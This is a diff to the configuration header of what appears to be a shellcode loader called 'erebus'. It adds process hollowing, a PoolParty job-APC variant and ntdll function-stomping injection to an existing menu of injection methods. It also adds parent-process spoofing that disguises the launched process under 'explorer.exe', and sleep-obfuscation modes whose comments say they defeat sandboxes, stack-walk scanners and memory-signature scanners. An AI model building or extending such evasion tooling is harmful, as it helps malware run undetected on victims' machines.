@@ -67,14 +67,17 @@
 // Target process for remote injection (defined per injection type below)
 
 // Injection technique:
-// 1 = NtMapViewOfSection  - Section mapping injection (Remote)
-// 2 = CreateFiber         - Fiber-based execution (Self) - requires shellcode ABI compliance
-// 3 = EarlyCascade        - Early Bird APC injection via NtQueueApcThread (Remote)
-// 4 = PoolParty           - Worker Factory thread pool injection (Remote)
-// 5 = NtQueueApcThread    - Vanilla NtQueueApcThread Early Bird with jittered post-APC delay (Remote)
-// 6 = ModuleStomp          - Map legitimate DLL, overwrite .text; VAD shows file-backed (Self)
-// 7 = KernelCallbackTable  - Overwrite PEB KCT entry, trigger via SendMessage (Self)
-// 8 = TxfHollow            - Transacted NTFS ghost section; VAD shows phantom file path (Remote)
+// 1  = NtMapViewOfSection   - Section mapping injection (Remote)
+// 2  = CreateFiber          - Fiber-based execution (Self) - requires shellcode ABI compliance
+// 3  = EarlyCascade         - Early Bird APC injection via NtQueueApcThread (Remote)
+// 4  = PoolParty            - Worker Factory thread pool injection (Remote)
+// 5  = NtQueueApcThread     - Vanilla NtQueueApcThread Early Bird with jittered post-APC delay (Remote)
+// 6  = ModuleStomp          - Map legitimate DLL, overwrite .text; VAD shows file-backed (Self)
+// 7  = KernelCallbackTable  - Overwrite PEB KCT entry, trigger via SendMessage (Self)
+// 8  = TxfHollow            - Transacted NTFS ghost section; VAD shows phantom file path (Remote)
+// 9  = PoolPartyJobApc      - PoolParty variant via I/O completion with job APC (Remote)
+// 10 = ProcessHollow        - Classic process hollowing; unmap image, write PE, redirect EP (Remote)
+// 11 = FunctionStomp        - Overwrite ntdll export prologue with JMP trampoline (Self)
 #ifndef CONFIG_INJECTION_TYPE
 #define CONFIG_INJECTION_TYPE 4
 #endif
@@ -95,6 +98,13 @@
 #define CONFIG_TARGET_PROCESS L"C:\\Windows\\System32\\calc.exe"
 #endif
 #define CONFIG_INJECTION_MODE 1  // Remote injection (Create Suspended)
+#elif CONFIG_INJECTION_TYPE == 10
+#ifndef CONFIG_TARGET_PROCESS
+#define CONFIG_TARGET_PROCESS L"C:\\Windows\\System32\\notepad.exe"
+#endif
+#define CONFIG_INJECTION_MODE 1  // Remote injection (Create Suspended)
+#elif CONFIG_INJECTION_TYPE == 11
+#define CONFIG_INJECTION_MODE 2  // Self injection
 #elif CONFIG_INJECTION_TYPE == 4
 #ifndef CONFIG_TARGET_PROCESS
 #define CONFIG_TARGET_PROCESS \
@@ -135,6 +145,34 @@
 #define ExecuteShellcode erebus::InjectionKernelCallback
 #elif CONFIG_INJECTION_TYPE == 8
 #define ExecuteShellcode erebus::InjectionTxfHollow
+#elif CONFIG_INJECTION_TYPE == 9
+#define ExecuteShellcode erebus::InjectionPoolPartyJobApc
+#elif CONFIG_INJECTION_TYPE == 10
+#define ExecuteShellcode erebus::InjectionProcessHollow
+#elif CONFIG_INJECTION_TYPE == 11
+#define ExecuteShellcode erebus::InjectionFunctionStomp
+#endif
+
+// ============================================
+// PPID SPOOFING CONFIGURATION
+// ============================================
+
+// 0 = disabled (use standard CreateProcessW)
+// 1 = enabled  (UpdateProcThreadAttribute PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)
+//              Requires CONFIG_INJECTION_MODE 1 (CreateProcessSuspended path).
+#ifndef CONFIG_PPID_SPOOF
+#define CONFIG_PPID_SPOOF 0
+#endif
+
+// ASCII process name used as the spoofed parent.
+// The builder passes -DCONFIG_PPID_SPOOF_TARGET_NAME=\"<name>\" via Makefile.
+// The hash is derived at compile time using the per-build seed so it stays
+// consistent with all other API hashes in the binary.
+#ifndef CONFIG_PPID_SPOOF_TARGET_NAME
+#define CONFIG_PPID_SPOOF_TARGET_NAME "explorer.exe"
+#endif
+#ifndef CONFIG_PPID_SPOOF_TARGET_HASH
+#define CONFIG_PPID_SPOOF_TARGET_HASH erebus::HashStringFowlerNollVoVariant1a(CONFIG_PPID_SPOOF_TARGET_NAME)
 #endif
 
 // ============================================
@@ -227,6 +265,10 @@
 // NtDelayExecution() - WaitableTimer fires at real wall-clock time.
 // Mode 2 additionally encrypts .rdata (where the shellcode blob lives)
 // during the wait window, defeating signature-based memory scanners.
+// 3 = Emulator exhaustion - Fibonacci burn + API hammering + large alloc before timer
+//                  (defeats emulator-based sandboxes via compute/memory pressure)
+// 4 = Full Ekko  - Type 2 + stack frame XOR + PE header wipe during sleep
+//                  (defeats stack-walk based scanners and PE header signatures)
 #ifndef CONFIG_SLEEP_OBFUSCATION_TYPE
 #define CONFIG_SLEEP_OBFUSCATION_TYPE 0
 #endif
